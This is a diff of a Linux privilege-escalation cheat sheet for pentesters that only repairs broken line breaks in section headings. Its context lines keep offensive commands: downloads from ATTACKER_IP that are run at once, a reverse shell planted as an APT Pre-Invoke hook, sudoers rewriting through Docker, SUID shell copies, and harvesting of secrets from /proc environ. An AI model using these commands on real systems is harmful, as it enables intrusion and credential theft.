@@ -32,7 +32,9 @@ Curated for penetration testers, security researchers, and engineers preparing f
 
 ---
 
-<a id="section-01"></a>\n\n## 01 — Automated System Enumeration & Triage
+<a id="section-01"></a>
+
+## 01 — Automated System Enumeration & Triage
 
 #### HERRAMIENTAS AUTOMATIZADAS / LinPEAS: Descarga contenido o ficheros desde una URL.
 ```bash
@@ -131,7 +133,9 @@ wget http://ATTACKER_IP/pspy32 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
 
 ---
 
-<a id="section-02"></a>\n\n## 02 — SUID & SGID Binary Exploitation (GTFOBins)
+<a id="section-02"></a>
+
+## 02 — SUID & SGID Binary Exploitation (GTFOBins)
 
 #### NOTAS IMPORTANTES PARA PENTESTERS
 ```bash
@@ -353,7 +357,9 @@ cp /bin/bash /tmp/nfs_mount/bash_suid && chmod +s /tmp/nfs_mount/bash_suid
 
 ---
 
-<a id="section-03"></a>\n\n## 03 — Sudo Privileges & NOPASSWD Misconfigurations
+<a id="section-03"></a>
+
+## 03 — Sudo Privileges & NOPASSWD Misconfigurations
 
 #### NOTAS IMPORTANTES PARA PENTESTERS: Enumera qué comandos puede ejecutar el usuario con sudo.
 ```bash
@@ -456,7 +462,9 @@ docker run --rm -v /etc/sudoers:/mnt/sudoers alpine sh -c "echo 'tuusuario ALL=(
 
 ---
 
-<a id="section-04"></a>\n\n## 04 — Scheduled Tasks, Cron Jobs & Wildcard Injection
+<a id="section-04"></a>
+
+## 04 — Scheduled Tasks, Cron Jobs & Wildcard Injection
 
 #### SISTEMA DE ARCHIVOS / Archivos importantes: Muestra el contenido del archivo indicado.
 ```bash
@@ -576,7 +584,9 @@ echo 'APT::Update::Pre-Invoke {"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/44
 
 ---
 
-<a id="section-05"></a>\n\n## 05 — Linux Capabilities Abuse (cap_setuid, cap_dac_read_search)
+<a id="section-05"></a>
+
+## 05 — Linux Capabilities Abuse (cap_setuid, cap_dac_read_search)
 
 #### Python con cap_setuid+ep: setuid(0) y lanza bash como root
 ```bash
@@ -619,7 +629,9 @@ python3 -c "import ctypes; import ctypes.util; ... # inject shellcode via ptrace
 
 ---
 
-<a id="section-06"></a>\n\n## 06 — Internal Services & Local Sockets Exploitation
+<a id="section-06"></a>
+
+## 06 — Internal Services & Local Sockets Exploitation
 
 #### COMANDOS DE RED: Muestra conexiones, puertos abiertos y listeners.
 ```bash
@@ -689,7 +701,9 @@ curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | python
 
 ---
 
-<a id="section-07"></a>\n\n## 07 — PATH Hijacking, LD_PRELOAD & Shared Library Injection
+<a id="section-07"></a>
+
+## 07 — PATH Hijacking, LD_PRELOAD & Shared Library Injection
 
 #### ⚡ VARIABLES Y ENTORNO / Variables de entorno
 ```bash
@@ -763,7 +777,9 @@ lxc config device add ignite host-root disk source=/ path=/mnt/root recursive=tr
 
 ---
 
-<a id="section-08"></a>\n\n## 08 — Linux Kernel Exploitation (Dirty COW, Dirty Pipe & Local CVEs)
+<a id="section-08"></a>
+
+## 08 — Linux Kernel Exploitation (Dirty COW, Dirty Pipe & Local CVEs)
 
 #### ️ INFORMACIÓN DEL SISTEMA: Muestra información del kernel y del sistema.
 ```bash
@@ -877,7 +893,9 @@ wget http://ATTACKER_IP/les.sh -O /tmp/les.sh && bash /tmp/les.sh 2>/dev/null
 
 ---
 
-<a id="section-09"></a>\n\n## 09 — Insecure NFS Mounts & no_root_squash Exploitation
+<a id="section-09"></a>
+
+## 09 — Insecure NFS Mounts & no_root_squash Exploitation
 
 #### ️ SERVICIOS DE RED Y NFS / Montaje NFS: Consulta o monta recursos remotos.
 ```bash
@@ -951,7 +969,9 @@ mount -o rw,vers=3 TARGET_IP:/share /tmp/nfs_mount
 
 ---
 
-<a id="section-10"></a>\n\n## 10 — Docker Containers, Socket Mounting & Container Escapes
+<a id="section-10"></a>
+
+## 10 — Docker Containers, Socket Mounting & Container Escapes
 
 #### 🐳 Docker Container Privilege Escalation – Cgroups Exploit & Capabilities
 ```bash
@@ -1043,7 +1063,9 @@ chroot /mnt/root /bin/bash
 
 ---
 
-<a id="section-11"></a>\n\n## 11 — Core System Commands & Linux Post-Exploitation
+<a id="section-11"></a>
+
+## 11 — Core System Commands & Linux Post-Exploitation
 
 #### ️ INFORMACIÓN DEL SISTEMA: Muestra el nombre del host actual.
 ```bash
@@ -3270,7 +3292,9 @@ cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i 'pass\|secret\|token\|k
 
 ---
 
-<a id="section-12"></a>\n\n## 12 — AI/ML Red Team Drill: PyTorch / MONAI Model Serialization Exploit
+<a id="section-12"></a>
+
+## 12 — AI/ML Red Team Drill: PyTorch / MONAI Model Serialization Exploit
 
 #### Mapa completo de la escalada. Se necesitan simultaneamente la shell del contenedor y la shell SSH de developer.
 ```bash
@@ -3479,7 +3503,9 @@ Remove NOPASSWD trainer rule | run in dedicated unprivileged service | isolate /
 
 ---
 
-<a id="advanced-training"></a>\n\n## 🎓 Advanced Hands-On Training
+<a id="advanced-training"></a>
+
+## 🎓 Advanced Hands-On Training
 
 Looking to sharpen your privilege escalation skills and Linux internal mechanics in real attack simulations?
 
